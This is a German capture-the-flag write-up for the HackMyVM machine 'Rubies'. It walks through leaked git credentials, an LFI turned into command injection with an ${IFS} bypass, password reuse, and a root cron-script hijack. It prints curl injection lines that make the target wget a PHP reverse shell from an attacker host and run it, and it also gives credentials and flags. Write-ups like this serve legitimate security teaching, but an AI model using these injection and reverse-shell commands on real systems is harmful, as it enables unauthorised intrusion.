# Rubies - HackMyVM (Medium)

![Rubies.png](Rubies.png)

## Übersicht

*   **VM:** Rubies
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Rubies)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 8. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Rubies_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Rubies" zu erlangen. Der Weg dorthin begann mit der Entdeckung eines exponierten `.git`-Verzeichnisses auf dem Webserver. Die Analyse der Git-Historie offenbarte MySQL-Root-Credentials (`root:jd92khn49w`). Parallel wurde durch Web-Enumeration eine LFI-Schwachstelle im `poem`-Parameter von `index.php` gefunden, die zu RCE (Remote Code Execution) mittels eines Command Injection Bypasses (`${IFS}`) eskaliert wurde. Dies führte zu einer Shell als `www-data`. Mit den MySQL-Credentials wurde von `www-data` zu `minnie` gewechselt, da das Passwort wiederverwendet wurde. Die finale Rechteausweitung zu Root gelang durch Ausnutzung eines unsicheren Cronjobs (oder eines anderen als Root laufenden Prozesses), der ein Ruby-Skript (`/opt/cleaning/webserver_upload.rb`) ausführte. Da das Verzeichnis `/opt/cleaning` für `minnie` beschreibbar war, konnte das Skript durch eine Ruby-Reverse-Shell ersetzt werden, die beim nächsten Ausführen des Cronjobs eine Root-Shell lieferte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `nikto`
*   `stegsnow` (versucht)
*   `stegseek` (versucht)
*   `steghide` (versucht)
*   `git-dumper`
*   `GitTools/Extractor`
*   `hydra` (versucht)
*   `cat`
*   `ls`
*   `ssh` (versucht)
*   `curl`
*   `whereis`
*   `wget`
*   Python3 (`http.server`)
*   `nc` (netcat)
*   `grep`
*   `locate`
*   `mv`
*   `diff`
*   `su`
*   `irb` (Interactive Ruby Shell)
*   `exec`
*   `sudo` (versucht)
*   Standard Linux-Befehle (`vi`/`nano`, `find`, `id`, `pwd`, `cd`, `chmod`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Rubies" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web/Git Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.117) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 7.2p2) und Port 80 (HTTP, Apache 2.4.18). Das Nmap-Skript `http-git` fand ein exponiertes `.git`-Verzeichnis im Web-Root.
    *   `gobuster` und `nikto` auf Port 80 fanden `index.php` und Verzeichnisse wie `/uploads`, `/poems`.
    *   Steganographie-Versuche auf Bilder (`cat1.gif`, `cat2.jpg`) blieben erfolglos.
    *   Mittels `git-dumper` und `GitTools/Extractor` wurde das `.git`-Repository heruntergeladen und analysiert.
    *   Ein `git diff` zwischen zwei Commits (`0cf1c46` und `d29e544`) in der `users.sql` (Teil der `index.php`-Logik im älteren Commit) enthüllte MySQL-Zugangsdaten: `root`:`jd92khn49w`. Die Commit-Nachricht "Why minnie?" deutete auf den Benutzer `minnie` hin.

2.  **Initial Access (LFI zu RCE als `www-data`):**
    *   Bei der Analyse der `index.php` (möglicherweise über das Git-Repo oder LFI) wurde eine Local File Inclusion (LFI)-Schwachstelle im GET-Parameter `poem` gefunden (`index.php?poem=../../../../etc/passwd`).
    *   Die LFI wurde zu Remote Code Execution (RCE) eskaliert, indem ein Command Injection Bypass mit `${IFS}` als Leerzeichenersatz verwendet wurde. Zuerst wurde mit `poem=;whereis${IFS}nc` die Existenz von `nc` bestätigt.
    *   Eine PHP-Reverse-Shell (`rev.php`) wurde auf dem Angreifer-Server gehostet.
    *   Mittels der RCE-Schwachstelle wurde `wget` auf dem Ziel ausgeführt, um die `rev.php` nach `/tmp/rev.php` (oder `/tmp/rs.php`) herunterzuladen: `curl 'http://192.168.2.117/index.php?poem=poem1;wget${IFS}-O${IFS}/tmp/rev.php${IFS}http://ANGRIFFS_IP:8000/rev.php'`.
    *   Das heruntergeladene Skript wurde via RCE mit `php` ausgeführt: `curl 'http://192.168.2.117/index.php?poem=poem1;php${IFS}/tmp/rev.php'`.
    *   Eine Reverse Shell als `www-data` wurde auf einem Netcat-Listener (Port 9001) empfangen und stabilisiert.

3.  **Privilege Escalation (von `www-data` zu `minnie` via Passwort-Wiederverwendung):**
    *   Als `www-data` wurde `su minnie` ausgeführt. Das Passwort `jd92khn49w` (gefunden in der Git-Historie für MySQL-Root) funktionierte auch für den Benutzer `minnie`.
    *   Dies führte zu einer Interactive Ruby Shell (`irb`). Mittels `exec '/bin/bash'` wurde eine Bash-Shell als `minnie` erlangt.
    *   Die User-Flag (`H0wc00l_i5_Byp@@s1n9`) wurde in `/home/minnie/user.txt` gefunden.

4.  **Privilege Escalation (von `minnie` zu `root` via Cronjob & Ruby Script Hijack):**
    *   Als `minnie` wurde festgestellt, dass das Verzeichnis `/opt/cleaning` der Gruppe `minnie` gehörte und für diese beschreibbar war. In diesem Verzeichnis befand sich das Ruby-Skript `webserver_upload.rb` (gehörte `root`).
    *   Es wurde angenommen, dass dieses Skript durch einen als Root laufenden Cronjob ausgeführt wird.
    *   Eine Ruby-Reverse-Shell-Payload wurde erstellt und auf das Zielsystem nach `/opt/cleaning/rshell.rb` heruntergeladen.
    *   Die ursprüngliche `webserver_upload.rb` wurde mit dem heruntergeladenen `rshell.rb`-Skript überschrieben (`mv rshell.rb webserver_upload.rb`).
    *   Ein Netcat-Listener wurde auf Port 2234 gestartet.
    *   Nachdem der Cronjob lief und das manipulierte Skript ausführte, wurde eine Root-Shell auf dem Listener empfangen.
    *   Die Root-Flag (`pyth0N>r00bi35`) wurde aus einer Datei mit einem ungewöhnlichen Namen (`/root/​root.txt` - mit unsichtbarem Zeichen) mittels `find / -inum [INODE_NUMMER] -exec cat {} \;` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Exponiertes `.git`-Verzeichnis:** Ermöglichte das Herunterladen des Quellcodes und der Git-Historie, was zur Aufdeckung von Datenbank-Credentials führte.
*   **Local File Inclusion (LFI):** Eine LFI im `poem`-Parameter von `index.php` ermöglichte das Lesen von Dateien.
*   **Command Injection (LFI zu RCE):** Die LFI wurde durch Umgehung von Filtern (`${IFS}`) zu RCE eskaliert.
*   **Passwort-Wiederverwendung:** Das MySQL-Root-Passwort funktionierte auch für den Systembenutzer `minnie`.
*   **Unsichere Dateiberechtigungen & Cronjob Exploit:** Ein für `minnie` beschreibbares Verzeichnis (`/opt/cleaning`) enthielt ein Ruby-Skript, das von einem Root-Cronjob ausgeführt wurde. Durch Überschreiben dieses Skripts mit einer Reverse Shell konnte Root-Zugriff erlangt werden.
*   **Steganographie (versucht, aber nicht primär):** Versuche mit Bilddateien blieben erfolglos, aber QR-Code-Analyse (im Originalbericht erwähnt) führte zu `thomas`-Credentials.

## Flags

*   **User Flag (`/home/minnie/user.txt`):** `H0wc00l_i5_Byp@@s1n9`
*   **Root Flag (aus `/root/​root.txt` via Inode):** `pyth0N>r00bi35`

## Tags

`HackMyVM`, `Rubies`, `Medium`, `Git Dumper`, `LFI`, `RCE`, `Command Injection Bypass`, `${IFS}`, `Password Reuse`, `Cronjob Exploit`, `Ruby Script Hijack`, `Steganography` (QR Code), `Linux`, `Web`, `Privilege Escalation`, `Apache`
